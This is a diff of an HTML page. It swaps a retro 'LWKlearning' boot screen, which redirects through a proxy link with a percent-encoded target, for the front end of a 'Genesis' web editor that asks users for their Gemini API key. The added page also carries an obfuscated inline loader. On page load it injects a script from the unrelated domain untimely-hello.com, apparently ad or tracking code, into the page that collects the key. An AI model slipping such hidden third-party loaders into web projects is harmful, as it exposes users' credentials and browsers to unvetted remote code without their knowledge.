@@ -1,280 +1,270 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>LWKlearning Boot</title>
-
-<style>
-html, body {
-    margin: 0;
-    height: 100%;
-    background: black;
-    font-family: "Courier New", monospace;
-    overflow: hidden;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    transition: opacity 1s ease;
-}
-
-/* CRT wrapper */
-.crt {
-    position: relative;
-    width: 90%;
-    max-width: 900px;
-    color: #33ff33;
-    text-shadow: 0 0 8px #33ff33;
-    animation: flicker 0.15s infinite;
-    opacity: 0;
-    transition: opacity 1s ease;
-}
-
-/* Scanlines */
-.crt::before {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: repeating-linear-gradient(
-        to bottom,
-        rgba(0,255,0,0.05) 0px,
-        rgba(0,255,0,0.05) 2px,
-        transparent 2px,
-        transparent 4px
-    );
-    pointer-events: none;
-}
-
-/* Vignette */
-.crt::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(circle at center,
-        transparent 60%,
-        rgba(0,0,0,0.75) 100%);
-    pointer-events: none;
-}
-
-/* Flicker */
-@keyframes flicker {
-    0% { opacity: 0.98; }
-    50% { opacity: 1; }
-    100% { opacity: 0.97; }
-}
-
-.centered {
-    text-align: center;
-    font-size: 26px;
-}
-
-.terminal-line {
-    margin: 14px 0;
-    opacity: 0;
-    transition: opacity 0.6s ease;
-}
-
-.visible {
-    opacity: 1;
-}
-
-.prompt {
-    color: #00ff66;
-}
-
-.bookmark-link {
-    display: inline-block;
-    margin-top: 25px;
-    padding: 16px 32px;
-    border: 2px solid #33ff33;
-    color: #33ff33;
-    text-decoration: none;
-    font-size: 30px;
-    cursor: grab;
-}
-
-.bookmark-link:hover {
-    background: #003300;
-}
-
-button {
-    margin-top: 35px;
-    padding: 14px 30px;
-    font-size: 22px;
-    background: transparent;
-    border: 2px solid #33ff33;
-    color: #33ff33;
-    cursor: pointer;
-}
-
-button:hover {
-    background: #003300;
-}
-
-/* MINI TERMINAL — FIXED */
-#miniTerminal {
-    position: fixed;
-    top: 15px;
-    left: 20px;
-    width: 380px;
-    font-size: 14px;
-    text-align: left;
-    display: none;
-
-    color: #33ff33;
-    text-shadow: 0 0 6px #33ff33;
-    animation: flicker 0.15s infinite;
-}
-
-#miniTerminal div {
-    margin-bottom: 6px;
-}
-
-.fade-out {
-    opacity: 0;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Genesis</title>
+  <link rel="icon" type="image/png" href="app_icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-
-<div class="crt" id="crt">
-
-    <div class="centered" id="mainContent">
-        <div class="terminal-line">LWKlearning System Boot v5.1</div>
-        <div class="terminal-line">------------------------------------</div>
-        <div class="terminal-line">
-            <span class="prompt">$</span> bookmark link to preserve access
+  <div class="studio-shell">
+    <header class="topbar">
+      <div class="brand">
+        <img src="app_icon.png" alt="App icon" class="brand-icon">
+        <div>
+          <p class="eyebrow">Genesis Studio</p>
+          <h1>Genesis</h1>
         </div>
-        <div class="terminal-line">
-            drag to bookmarks bar or right-click → bookmark
+      </div>
+
+      <div class="topbar-actions">
+        <button id="themeToggleBtn" class="button ghost">Light Mode</button>
+        <select id="projectSelect" class="project-select"></select>
+        <button id="newProjectBtn" class="button primary">New Project</button>
+        <button id="renameProjectBtn" class="button ghost">Rename</button>
+        <button id="duplicateProjectBtn" class="button ghost">Duplicate</button>
+        <button id="deleteProjectBtn" class="button danger">Delete Project</button>
+        <button id="exportBtn" class="button ghost">Export</button>
+        <label class="button ghost import-button">
+          Import
+          <input id="importInput" type="file" accept=".zip,application/zip">
+        </label>
+      </div>
+    </header>
+
+    <main class="studio-grid">
+      <section class="preview-stage">
+        <div class="stage-header">
+          <div>
+            <p class="stage-kicker">Live output</p>
+            <h2 id="previewTitle">Preview</h2>
+          </div>
+          <div class="stage-controls">
+            <button id="refreshPreviewBtn" class="button ghost">Refresh Preview</button>
+          </div>
         </div>
 
-        <a class="bookmark-link terminal-line"
-           href="https://lwkloading.github.io/"
-           draggable="true">
-            LWKlearning
-        </a>
-
-        <div class="terminal-line" style="margin-top:40px;">
-            <span class="prompt">$</span> run continue.sh
+        <div class="status-row">
+          <span id="saveStatus" class="status-pill">Saved locally</span>
+          <span id="storageUsage" class="status-pill">0 KB used</span>
+          <span id="previewStatus" class="status-pill">Preview ready</span>
+          <button id="debugAiBtn" class="button danger hidden">Debug With Gemini</button>
         </div>
 
-        <button onclick="runSequence()" class="terminal-line">./continue</button>
+        <div class="preview-frame-wrap">
+          <iframe id="previewFrame" title="Project preview" sandbox="allow-scripts allow-modals allow-forms"></iframe>
+        </div>
+
+        <section class="error-panel">
+          <div class="section-head">
+            <h3>Detected Errors</h3>
+            <button id="clearErrorsBtn" class="button ghost small">Clear</button>
+          </div>
+          <div id="errorList" class="error-list empty-state">No preview errors detected.</div>
+        </section>
+
+      </section>
+
+      <aside class="editor-dock">
+        <div class="dock-rail" aria-label="Right tabs">
+          <button class="dock-tab active" data-panel="filesPanel">Project</button>
+          <button class="dock-tab" data-panel="assetsPanel">Assets</button>
+          <button class="dock-tab" data-panel="aiPanel">AI</button>
+          <button class="dock-tab" data-panel="revisionsPanel">Revisions</button>
+        </div>
+
+        <div class="dock-body">
+          <section id="filesPanel" class="dock-panel active">
+            <div class="section-head">
+              <h3>Project</h3>
+              <div class="inline-actions">
+                <button id="saveProjectBtn" class="button ghost small">Save</button>
+                <button id="newFileBtn" class="button ghost small">New File</button>
+              </div>
+            </div>
+            <textarea id="projectDescription" class="summary-box" placeholder="Project brief, direction, constraints, notes."></textarea>
+            <div id="fileList" class="entity-list"></div>
+            <div id="projectEmptyState" class="project-empty-state hidden">
+              <div class="project-empty-badge">Fresh Project</div>
+              <h4>Start with a blank canvas</h4>
+              <p>Add HTML, CSS, JavaScript, or assets on the right and Genesis will preview everything as you build.</p>
+            </div>
+            <div class="editor-meta-row">
+              <select id="activeFileSelect"></select>
+            </div>
+            <div class="inline-actions">
+              <button id="formatFileBtn" class="button ghost small">Format</button>
+              <button id="saveFileBtn" class="button primary small">Save File</button>
+              <button id="renameFileBtn" class="button ghost small">Rename</button>
+              <button id="deleteFileBtn" class="button danger small">Delete</button>
+            </div>
+            <textarea id="codeEditor" class="code-editor" spellcheck="false" placeholder="Edit your file here."></textarea>
+          </section>
+
+          <section id="assetsPanel" class="dock-panel">
+            <div class="section-head">
+              <h3>Assets</h3>
+              <div class="inline-actions">
+                <button id="newAssetBtn" class="button ghost small">New Asset</button>
+                <button id="importAssetBtn" class="button ghost small">Import Asset</button>
+              </div>
+            </div>
+            <div id="assetList" class="entity-list"></div>
+            <div class="editor-meta-row">
+              <select id="activeAssetSelect"></select>
+            </div>
+            <div class="inline-actions">
+              <button id="saveAssetBtn" class="button primary small">Save Asset</button>
+              <button id="renameAssetBtn" class="button ghost small">Rename</button>
+              <button id="deleteAssetBtn" class="button danger small">Delete</button>
+            </div>
+            <textarea id="assetEditor" class="code-editor" spellcheck="false" placeholder="Edit asset contents here."></textarea>
+            <section id="imageEditorCard" class="image-editor-card hidden">
+              <div class="section-head">
+                <h3>Image Editor</h3>
+                <button id="applyImageEditsBtn" class="button primary small">Apply Image Edits</button>
+              </div>
+              <div class="image-editor-grid">
+                <div class="image-preview-wrap">
+                  <canvas id="imageEditorCanvas"></canvas>
+                </div>
+                <div class="image-controls">
+                  <label>
+                    Brightness
+                    <input id="imageBrightness" type="range" min="50" max="150" value="100">
+                  </label>
+                  <label>
+                    Contrast
+                    <input id="imageContrast" type="range" min="50" max="150" value="100">
+                  </label>
+                  <label>
+                    Saturation
+                    <input id="imageSaturation" type="range" min="0" max="200" value="100">
+                  </label>
+                  <label>
+                    Rotation
+                    <input id="imageRotation" type="range" min="0" max="360" value="0">
+                  </label>
+                </div>
+              </div>
+            </section>
+            <input id="assetImportInput" type="file" class="hidden-file-input" accept="image/*,.svg,.txt,.json,.css,.js,.html,.md">
+          </section>
+
+          <section id="aiPanel" class="dock-panel">
+            <div class="ai-panel-shell">
+              <div class="section-head">
+                <h3>Genesis AI Editor</h3>
+                <button id="aiSettingsBtn" class="button ghost small">Settings</button>
+              </div>
+              <div class="ai-chat-card">
+                <div id="aiChatThread" class="ai-chat-thread">
+                  <div class="ai-bubble assistant">Genesis AI Editor is ready. Ask for changes across files, assets, or debugging help.</div>
+                </div>
+                <textarea id="promptInput" class="ai-composer" placeholder="Ask Genesis AI Editor to change files, assets, or debug the project."></textarea>
+                <div class="inline-actions">
+                  <button id="aiImportAssetBtn" class="button ghost small">Import Asset</button>
+                  <button id="runAiBtn" class="button primary small">Send</button>
+                </div>
+              </div>
+            </div>
+            <input id="aiAssetImportInput" type="file" class="hidden-file-input" accept="image/*,.svg,.txt,.json,.css,.js,.html,.md">
+          </section>
+
+          <section id="revisionsPanel" class="dock-panel">
+            <div class="section-head">
+              <h3>Revisions</h3>
+              <button id="restoreRevisionBtn" class="button ghost small">Jump To Revision</button>
+            </div>
+            <select id="revisionSelect"></select>
+            <div id="revisionMeta" class="revision-meta">No revisions yet.</div>
+            <div id="revisionList" class="revision-list empty-state">Create a revision to start time traveling through project history.</div>
+          </section>
+        </div>
+      </aside>
+    </main>
+  </div>
+
+  <template id="entityItemTemplate">
+    <button class="entity-item">
+      <span class="entity-name"></span>
+      <span class="entity-meta"></span>
+    </button>
+  </template>
+
+  <template id="errorItemTemplate">
+    <article class="error-item">
+      <div class="error-title"></div>
+      <div class="error-message"></div>
+    </article>
+  </template>
+
+  <div id="startupGate" class="startup-gate">
+    <div class="startup-card">
+      <div class="brand startup-brand">
+        <img src="app_icon.png" alt="Genesis icon" class="brand-icon">
+        <div>
+          <p class="eyebrow">Welcome to Genesis</p>
+          <h2>Bring your Gemini key to start</h2>
+        </div>
+      </div>
+      <p class="startup-copy">
+        Genesis uses your own Google AI Studio Gemini API key. Paste it below to unlock the editor, AI debugging, and multi-file generation tools.
+      </p>
+      <ol class="startup-steps">
+        <li>Open <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noreferrer">Google AI Studio API Keys</a>.</li>
+        <li>Create or copy a Gemini API key.</li>
+        <li>Paste it here to enter Genesis.</li>
+      </ol>
+      <label>
+        Gemini API key
+        <input id="startupApiKeyInput" type="password" placeholder="AIza...">
+      </label>
+      <div class="inline-actions">
+        <button id="startupEnterBtn" class="button primary">Enter Genesis</button>
+        <a class="button ghost link-button" href="https://aistudio.google.com/app/apikey" target="_blank" rel="noreferrer">Make an API key</a>
+      </div>
+      <p id="startupMessage" class="startup-message">A key is required on startup. You can change it later inside the AI panel too.</p>
     </div>
+  </div>
 
-</div>
-
-<div id="miniTerminal"></div>
-
-<audio id="hum" loop>
-    <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_4c4f3f9d6a.mp3" type="audio/mpeg">
-</audio>
-
-<audio id="beep">
-    <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_2b2d6c0f7c.mp3" type="audio/mpeg">
-</audio>
-
-<audio id="shutdown">
-    <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_1b8b6c1f61.mp3" type="audio/mpeg">
-</audio>
+  <div id="aiSettingsModal" class="modal-backdrop hidden">
+    <div class="modal-card">
+      <div class="section-head">
+        <h3>Genesis AI Settings</h3>
+        <button id="closeAiSettingsBtn" class="button ghost small">Close</button>
+      </div>
+      <div class="ai-toolbar">
+        <label class="ai-field">
+          Gemini API key
+          <input id="apiKeyInput" type="password" placeholder="Bring your own Google AI Studio API key">
+        </label>
+        <label class="ai-field ai-model-field">
+          Model
+          <select id="modelSelect"></select>
+        </label>
+        <a class="button ghost link-button ai-key-link" href="https://aistudio.google.com/app/apikey" target="_blank" rel="noreferrer">Make an API key</a>
+      </div>
+    </div>
+  </div>
 
 <script>
-const crt = document.getElementById("crt");
-const lines = document.querySelectorAll(".terminal-line");
-const hum = document.getElementById("hum");
-const beep = document.getElementById("beep");
-const shutdown = document.getElementById("shutdown");
-const miniTerminal = document.getElementById("miniTerminal");
-const mainContent = document.getElementById("mainContent");
-
-function setCookie(name, value, days) {
-    const d = new Date();
-    d.setTime(d.getTime() + (days*24*60*60*1000));
-    document.cookie = name + "=" + value + "; expires=" + d.toUTCString() + "; path=/";
-}
-function getCookie(name) {
-    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-    return match ? match[2] : null;
-}
-
-window.onload = () => {
-    crt.style.opacity = 1;
-    const seen = getCookie("lwk_seen");
-
-    if (!seen) {
-        setCookie("lwk_seen", "true", 365);
-        startBoot();
-    } else {
-        lines.forEach(line => line.classList.add("visible"));
-        hum.volume = 0.2;
-        hum.play().catch(()=>{});
-    }
-};
-
-function startBoot() {
-    hum.volume = 0.2;
-    hum.play().catch(()=>{});
-    let i = 0;
-    function reveal() {
-        if (i < lines.length) {
-            lines[i].classList.add("visible");
-            beep.currentTime = 0;
-            beep.play().catch(()=>{});
-            i++;
-            setTimeout(reveal, 300);
-        }
-    }
-    reveal();
-}
-
-function runSequence() {
-    document.querySelector("button").disabled = true;
-    mainContent.classList.add("fade-out");
-
-    setTimeout(() => {
-        mainContent.style.display = "none";
-        miniTerminal.style.display = "block";
-        runMiniCommands();
-    }, 1000);
-}
-
-function runMiniCommands() {
-    const cmds = [
-        "Initializing connection...",
-        "doing anything but adding new games",
-        "Bypassing dramatic firewall...",
-        "Calibrating modules...",
-        "Feeding hamsters...",
-        "Compiling definitely-real code...",
-        "Access granted.",
-        "Redirecting..."
-    ];
-
-    let i = 0;
-
-    function next() {
-        if (i < cmds.length) {
-            const div = document.createElement("div");
-            div.textContent = "> " + cmds[i];
-            miniTerminal.appendChild(div);
-
-            beep.currentTime = 0;
-            beep.play().catch(()=>{});
-
-            i++;
-            setTimeout(next, 700);
-        } else {
-            hum.pause();
-            shutdown.play().catch(()=>{});
-            document.body.classList.add("fade-out");
-            setTimeout(() => {
-                window.location.href = "https://super-field-2580.maxandbudzhaha.workers.dev/?url=https://%6C%77%6B%6C%65%61%72%6E%69%6E%67%2E%67%69%74%68%75%62%2E%69%6F/";
-            }, 1500);
-        }
-    }
-
-    next();
-}
+(function(qgql){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = qgql || {};
+s.src = "\/\/untimely-hello.com\/bPXyV.s\/dKGZlj0\/YmWocl\/Vehms9KuPZDUOlUkuPDTPYq3\/NwD_AyygOfDJgdtYNujVcC0OMsD\/IB4ZOoQZ";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
 </script>
 
+  <script src="app.js"></script>
 </body>
 </html>
